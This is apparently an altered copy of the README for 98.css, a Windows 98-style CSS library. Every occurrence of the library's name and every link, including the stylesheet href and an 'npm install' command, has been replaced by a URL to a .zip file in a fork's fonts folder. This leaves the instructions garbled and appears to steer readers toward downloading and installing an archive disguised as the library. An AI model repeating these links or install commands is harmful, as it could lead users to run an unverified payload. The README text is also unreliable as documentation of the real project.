https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip is a CSS file that takes semantic HTML and makes it look pretty. It does not ship with any JavaScript, so it is compatible with your frontend framework of choice.

### Installation / Usage

The easiest way to use https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip is to import it from [unpkg](https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip).

```html
<!DOCTYPE html>
<html>
<head>
  <title>https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip example</title>
  <meta charset="UTF-8" />
  <link rel="stylesheet" href="https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip" />
</head>

<body>
  <div class="window" style="margin: 32px; width: 250px">
    <div class="title-bar">
      <div class="title-bar-text">
        My First VB4 Program
      </div>
    </div>
    <div class="window-body">
      <p>Hello, world!</p>
    </div>
  </div>
</body>
</html>
```

Alternatively, you can grab https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip for [the releases page](https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip) or [npm](https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip).

```
npm install https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip
```

### Developing

First, run `npm install`.

[`https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip`](https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip) is where everything happens.

You can use `npm start` to start a development environment that will watch for file changes and rebuild https://github.com/wilcojas/98.css/raw/refs/heads/main/fonts/css-v1.2.zip, reloading your browser in the process.

You can run a build manually with `npm run build`. This will write to the `dist/` directory.
